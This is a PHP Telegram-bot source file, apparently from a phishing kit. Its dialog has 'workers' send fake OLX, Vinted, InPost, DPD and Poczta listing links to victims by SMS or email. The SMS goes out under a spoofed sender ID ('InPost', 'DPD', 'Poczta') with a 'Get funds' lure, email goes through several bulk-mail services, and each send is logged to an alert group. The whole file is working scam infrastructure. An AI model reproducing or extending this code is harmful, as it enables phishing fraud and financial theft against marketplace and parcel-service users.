<?php

namespace App\Telegram\Dialogs;

use App\Api\SmsApi;
use App\Mail\SendEmailFake;
use App\Models\Category;
use App\Models\Country;
use App\Models\TelegramUser;
use App\Services\Kmail;
use App\Services\PechkinEmailApi;
use Exception;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Mail;
use Log;
use App\Models\Fake;
use Telegram\Bot\Keyboard\Keyboard;
use Telegram\Bot\Exceptions\TelegramSDKException;
use Telegram\Bot\Objects\Update;
use Throwable;

class SendDialog extends Dialog
{
    /**
     * @var string
     */
    public $type;
    public $warnings = ['kmail', 'pechkin'];
    public $sources = ['kmail' => 'источник 1', 'mailgun' => 'источник 2', 'pechkin' => 'источник 3'];

    public function __construct(Update $update, ?TelegramUser $user)
    {
        parent::__construct($update, $user);
        if (app()->isLocal()) {
            $this->sources = array_merge($this->sources, ['smtp' => 'SMTP']);
        }
        $this->type = ($this->getData('type') === 'email') ? 'email' : 'sms';
        if ($this->type === 'email') {
            $steps = [
                'getFake',
                'mailDriverSelection',
            ];

            if ($this->getData('has_warning', false)) {
                $steps[] = ['name' => 'warning', 'is_dich' => true];
            }
            $steps[] = 'sendEmail';
            $this->setSteps($steps);
        }
    }

    protected $steps = [
        'getFake',
        'sendSms'
    ];

    public function getFake()
    {
        try {
            $btns = $this->getConfig('btns');
            $track_id = $this->getData('track_id');
            if (is_null($track_id)) {
                $text = "❗️ <b>Такой объявление не существует!</b>";
                $keyboard = Keyboard::make([
                    "keyboard" => [[["text" => $btns->get('start') ?? '']]],
                    "resize_keyboard" => true,
                    "one_time_keyboard" => false,
                ]);
                $this->end();
            } else {
                $text = ($this->type === 'email')
                    ? "❕ <i>Выберите источник для отправки</i>"
                    : "❕ <i>Напишите номер телефона в формате </i><b>48889404173</b>";
                $sources = collect($this->sources)->map(function ($value) {
                    return ["text" => $value];
                })->values()->toArray();
                $keyboard = Keyboard::make([
                    "keyboard" => $this->type === 'email'
                        ? [$sources, [["text" => $btns->get('back')]]]
                        : [[["text" => $btns->get('back')]]],
                    "resize_keyboard" => true,
                    "one_time_keyboard" => false,
                ]);
            }
            $this->telegram->sendMessage([
                "chat_id" => $this->getChat()->getId(),
                "text" => $text,
                "parse_mode" => "html",
                "reply_markup" => $keyboard
            ]);
        } catch (TelegramSDKException|Throwable $e) {
            Log::error($e->getMessage());
        }
    }

    public function sendSms()
    {
        try {
            $btns = $this->getConfig()['btns'];
            $number = trim($this->update->getMessage()->getText());
            if (!empty($number) && preg_match("/^\+?[0-9]{6,14}$/", $number)) {
                $this->setData('number', $number);
                $this->setData('error', false);
                $data = $this->getData()->only(['track_id', 'number'])->toArray();
                $fake = Fake::whereTrackId($data['track_id'])->first();
                $locale = $fake->country->locale ?? Country::locale(Country::POLAND);
                if (!App::isLocale($locale)) App::setLocale($locale);
                $link = SmsApi::getSlug($data['number'], $fake->link(false, true));
                if (parse_url($link, PHP_URL_SCHEME) === 'http') $link = str_replace('http://', 'https://', $link);
                switch ($fake->category->name) {
                    case Category::OLX:
                    case Category::VINTED:
                    case Category::INPOST:
                    case Category::ALLEGROLOKALNIE:
                        $senderID = 'InPost';
                        break;
                    case Category::DPD:
                        $senderID = 'DPD';
                        break;
                    default:
                        $senderID = 'Poczta';
                        break;
                }
                $result = SmsApi::sendSms($data['number'], __("Get funds : :link", ["link" => "https://$link"]), $senderID)->getData(true);
                if ($result['error']) {
                    $text = $this->makeText([
                        "❗️ <b>Ошибка</b>",
                        "",
                        "<i>{$result['msg']}</i>"
                    ]);
                } else {
                    $fake->update(['sent_from' => $this->type]);
                    $text = "<i>Сообщения успешно отправлен на номер</i> <b>{$data['number']}}</b>";
                    if ($alertId = $this->getConfig('groups.alert.id')) $this->telegram->sendMessage([
                        "chat_id" => $alertId,
                        "text" => makeText([
                            $text,
                            "🐵 Воркер: <b>{$this->getUser()->accountLinkVisibly()}</b>",
                        ]),
                        "parse_mode" => "html",
                    ]);
                }
                $keyboard = Keyboard::make([
                    "keyboard" => [
                        [["text" => $btns['start']]],
                    ],
                    "resize_keyboard" => true,
                    "one_time_keyboard" => false,
                ]);
                $this->telegram->sendMessage([
                    'chat_id' => $this->getChat()->getId(),
                    'text' => $text,
                    "parse_mode" => "html",
                    "reply_markup" => $keyboard
                ]);
            } else {
                $this->setData('error', true);
                $this->telegram->sendMessage([
                    'chat_id' => $this->getChat()->getId(),
                    'text' => "❗️ <i>Укажите правильный номер телефона</i>",
                    "parse_mode" => "html",
                ]);
                $this->jump('getFake');
                $this->proceed();
            }
        } catch (TelegramSDKException|Throwable $e) {
            Log::error($e->getMessage());
        }
    }

    public function mailDriverSelection()
    {
        try {
            $mailDriver = $this->isBack() || $this->getData('error')
                ? $this->getData('mail_driver')
                : trim($this->update->getMessage()->getText());
            if (in_array($mailDriver, $this->sources)) {
                $user = $this->getUser();
                $keyCache = "warnings.id.{$user->id}";
                $this->setData('mail_driver', $mailDriver);
                Log::info('$mailDriver',[$mailDriver]);
                $driver = array_search($mailDriver, $this->sources, true);
                if (in_array($driver, $this->warnings) && !Cache::has($keyCache)) {
                    $this->setData('has_warning', true);
                    $this->telegram->sendMessage([
                        'chat_id' => $this->getChat()->getId(),
                        'text' => "❕<i>" . setting('email_warning', 'Предупреждение !') . "</i>",
                        "parse_mode" => "html",
                        "reply_markup" => Keyboard::make([
                            "keyboard" => [[["text" => "принять"]]],
                            "resize_keyboard" => true,
                            "one_time_keyboard" => true,
                        ])
                    ]);
                } else {
                    $this->telegram->sendMessage([
                        "chat_id" => $this->getChat()->getId(),
                        "text" => "❕ <i>Напишите почту получателя</i>",
                        "parse_mode" => "html",
                        "reply_markup" => Keyboard::make([
                            "keyboard" => [[["text" => $this->getConfig('btns')->get('back') ?? '/back']]],
                            "resize_keyboard" => true,
                            "one_time_keyboard" => false,
                        ])
                    ]);
                }
            } else {
                $this->setData('mail_driver');
                $this->setData('error', true);
                $this->telegram->sendMessage([
                    'chat_id' => $this->getChat()->getId(),
                    'text' => "❗️ <i>Сервис не выбран</i>",
                    "parse_mode" => "html",
                ]);
                $this->jump('getFake');
                $this->proceed();
            }
        } catch (Throwable|TelegramSDKException $e) {
            Log::error($e->getMessage());
        }
    }

    public function sendEmail()
    {
        try {
            $btns = $this->getConfig()['btns'];
            $email = trim($this->update->getMessage()->getText());
            $driver = array_search($this->getData('mail_driver', 'источник 1'), $this->sources, true);
            Log::info('fff', [$email, $driver]);
            if (!empty($email) && filter_var($email, FILTER_VALIDATE_EMAIL)) {
                $this->setData('email', $email);
                $this->setData('error', false);
                $data = $this->getData()->only(['track_id', 'email'])->toArray();
                $fake = Fake::whereTrackId($data['track_id'])->first();
                $user = $this->getUser();
                switch ($driver) {
                    case 'pechkin':
                        $pechkin = new PechkinEmailApi();
                        if (!$pechkin->send($data['email'], $fake->link(false, true))) {
                            throw new Exception("PechkinEmailApi error");
                        }
                        break;
                    case 'kmail':
                        $kmail = new Kmail();
                        $url = $fake->link(false, true);
                        if ($shortUrl = $kmail->shortUrl($url)) {
                            $url = $shortUrl;
                        }
                        switch ($fake->locale) {
                            case 'cs':
                                $locale = 'cz';
                                break;
                            default:
                                $locale = $fake->locale;
                                break;
                        }
                        $service = "{$fake->category->name}.${locale}";
                        if (!$kmail->send($data['email'], $url, $user->id, $service)) {
                            throw new Exception("Kmail error");
                        }
                        break;
                    default:
                        config(['mail.default' => $driver]);
                        Mail::driver($driver)->to($data['email'])->send(new SendEmailFake($fake));
                        break;
                }
                $fake->update(['sent_from' => $this->type]);
                $text = [];
                $text[] = "<i>Сообщения успешно отправлен на почту</i> <b>{$data['email']}</b>";

                if ($alertId = $this->getConfig('groups.alert.id')) {
                    $text[] = "🐵 Воркер: <b>{$this->getUser()->accountLinkVisibly()}</b>";
                    $this->telegram->sendMessage([
                        "chat_id" => $alertId,
                        "text" => makeText($text),
                        "parse_mode" => "html",
                    ]);
                }
                $keyboard = Keyboard::make([
                    "keyboard" => [
                        [["text" => $btns['start']]],
                    ],
                    "resize_keyboard" => true,
                    "one_time_keyboard" => false,
                ]);
                $this->telegram->sendMessage([
                    'chat_id' => $this->getChat()->getId(),
                    'text' => makeText($text),
                    "parse_mode" => "html",
                    "reply_markup" => $keyboard
                ]);

            } else {
                $this->setData('error', true);
                $this->telegram->sendMessage([
                    'chat_id' => $this->getChat()->getId(),
                    'text' => "❗️ <i>Укажите правильную почту</i>",
                    "parse_mode" => "html",
                ]);
                $this->jump('mailDriverSelection');
                $this->proceed();
                return;
            }
        } catch (Throwable|TelegramSDKException $e) {
            Log::error($e->getMessage());
            if (!$e instanceof TelegramSDKException) {
                try {
                    $this->telegram->sendMessage([
                        'chat_id' => $this->getChat()->getId(),
                        'text' => "❗️ <i>Ошибка доступа, обратитесь к администратору</i>",
                        "parse_mode" => "html",
                    ]);
                } catch (TelegramSDKException $e) {
                }
            }
        }
        $this->end();
    }

    public function warning()
    {
        try {
            $user = $this->getUser();
            $keyCache = "warnings.id.{$user->id}";
            if ($this->yes) Cache::rememberForever($keyCache, function () {
                return true;
            });
            $this->telegram->sendMessage([
                "chat_id" => $this->getChat()->getId(),
                "text" => "❕ <i>Напишите почту получателя</i>",
                "parse_mode" => "html",
                "reply_markup" => Keyboard::make([
                    "keyboard" => [[["text" => $this->getConfig('btns')->get('back') ?? '/back']]],
                    "resize_keyboard" => true,
                    "one_time_keyboard" => true,
                ])
            ]);
            return;
        } catch (Throwable $throwable) {
            Log::error("SendDialog::warning - {$throwable->getMessage()}");
        }
    }
}
